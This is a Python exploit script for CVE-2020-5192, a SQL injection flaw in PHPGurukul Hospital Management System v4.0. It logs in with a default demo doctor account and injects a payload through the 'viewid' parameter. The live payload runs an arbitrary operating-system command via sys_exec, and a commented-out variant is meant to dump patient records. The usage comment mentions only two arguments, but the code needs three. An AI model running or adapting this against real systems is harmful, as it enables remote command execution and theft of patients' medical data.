# CVE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5192
# PHPGurukul Hospital Management System in PHP v4.0 suffers from multiple
# SQL injection vulnerabilities: multiple pages and parameters are not
# validating user input, and allow for the application's database and
# information to be fully compromised.
#
# How to run the exploit?
# python3 exploit.py 127.0.0.1 80
#
# Exploit: https://www.exploit-db.com/exploits/47840
# How it works?
# 1. Uses a pre-existing account with user:pass = test@demo.com:Test@123 to log in
# 2. Views a patient as a doctor
# 3. `viewid` param is not sanitized

import sys
import requests

if __name__ == '__main__':
    host = sys.argv[1]
    port = sys.argv[2]
    cmd = sys.argv[3]
    session = requests.Session()

    # login
    login_form_url = 'http://%s:%s/hms/hms/doctor/index.php' % (host, port)
    session.get(login_form_url)
    login_url = 'http://%s:%s/hms/hms/doctor/index.php' % (host, port)
    form_data = {
        'username': 'test@demo.com',
        'password': 'Test@123',
        'submit': '',
        'submit': ''
    }
    session.post(login_url, data=form_data)
    
    # view patient, send SQL payload
    view_patient_url = 'http://%s:%s/hms/hms/doctor/view-patient.php' % (host, port)
    form_data = {
        # 'viewid': "7' OR 3413=3413 OR 'nBkv'='nBkv"
        'viewid': "7' OR (select sys_exec('%s')) AND '1" % cmd
    }
    res = session.get(view_patient_url, params=form_data)
    # Dumps all patient records
    print(res.text)
    session.close()
